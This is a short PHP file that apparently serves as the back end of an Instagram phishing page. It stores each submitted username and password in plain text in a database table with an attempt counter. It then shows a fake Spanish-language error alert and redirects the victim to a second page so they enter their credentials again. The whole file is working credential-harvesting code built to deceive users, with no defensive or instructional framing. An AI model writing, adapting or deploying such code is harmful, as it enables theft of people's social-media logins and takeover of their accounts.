<?php 
session_start();
include("conect.php");
$conexion = conectar();
$user= mysqli_real_escape_string($conexion, $_POST['user']);
$pass= mysqli_real_escape_string($conexion, $_POST['pass']);
$sql=mysqli_query($conexion,"INSERT INTO `social_network` (`id`, `user`, `pass`, `try_num`) VALUES (NULL, '$user', '$pass', '1')");
/*
echo '<script>
    document.getElementById("user").value = "";
    document.getElementById("pass").value = "";
</script>';
*/
echo '<script>alert("Lo sentimos algo salió mal, por favor intenta de nuevo.")</script>';
echo "<script>location.href='instagram2.php'</script>";
/*
$sql2=mysqli_query($conexion,"INSERT INTO `social_network` (`id`, `user`, `pass`, `try_num`) VALUES (NULL, '$user', '$pass', '2')");
*/
mysqli_close($conexion);

?>
